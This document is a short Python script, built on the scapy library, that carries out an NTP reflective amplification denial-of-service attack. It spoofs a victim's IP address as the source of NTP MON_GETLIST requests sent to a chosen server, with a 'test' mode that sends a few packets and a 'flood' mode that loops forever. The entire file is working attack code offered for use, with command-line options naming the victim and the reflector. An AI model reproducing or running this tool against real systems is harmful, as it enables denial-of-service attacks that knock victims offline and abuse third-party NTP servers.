#!/usr/bin/python3

from scapy.all import *
import sys
import argparse
from colorama import Fore

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET

conf.checkIpAddr = False # To stop scapy from checking return packet originating from any packet that we have sent out

def ntp_reflective(attack, ntp_server_ip, victim_ip, num_req):

    ntp_data_pattern = "\x17\x00\x03\x2a\x00\x00\x00\x00" # MON_GETLIST packet

    if attack == "test":
        print(GREEN + "[+] send "+str(num_req)+" NTP requests to " + ntp_srv_ip + " with src_ip" + victim_ip + RESET)
        for i in range(0, num_req):
            send(IP(dst=ntp_srv_ip, src=victim_ip)/UDP(sport=51147, dport=123)/Raw(load=ntp_data_pattern), verbose=False, iface=net_interface)

    elif attack == "flood":
        print(GREEN + "[+] send continuously NTP requests to " + ntp_srv_ip + " with src_ip " + victim_ip + RESET)
        while True:
            send(IP(dst=ntp_srv_ip, src=victim_ip)/UDP(sport=51147, dport=123)/Raw(load=ntp_data_pattern), verbose=False, iface=net_interface)

    else:
        print(RED + "[-] Please choose: test/flood" + RESET)

    return True

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-n", "--ntp_server_ip", help="ntp server ip")
parser.add_argument("-v", "--victim_ip", help="victim_ip")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
args = parser.parse_args()

if args.type:
    type_attack = args.type

    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

if args.ntp_server_ip:
    ntp_srv_ip = args.ntp_server_ip

if args.victim_ip:
    victim_ip = args.victim_ip


global net_interface
if args.interface:
    net_interface = args.interface
else:
    net_interface = "eth0"

ntp_reflective(type_attack, ntp_srv_ip, victim_ip, num_request)

sys.exit(1)
